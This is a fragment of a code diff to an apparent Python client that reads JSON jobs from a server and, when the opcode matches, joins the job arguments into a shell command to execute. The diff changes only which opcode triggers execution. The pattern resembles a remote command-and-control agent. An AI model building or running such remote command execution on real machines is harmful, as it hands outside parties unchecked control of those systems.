@@ -37,7 +37,7 @@ def register():
             continue
         job = json.loads(r.text)
         if job:
-            if job["opcode"] == 0:
+            if job["opcode"] == 1:
                 # Execute shell command and return output
                 cmd = " ".join(job["args"])
                 print(f"Executing command: {cmd}")
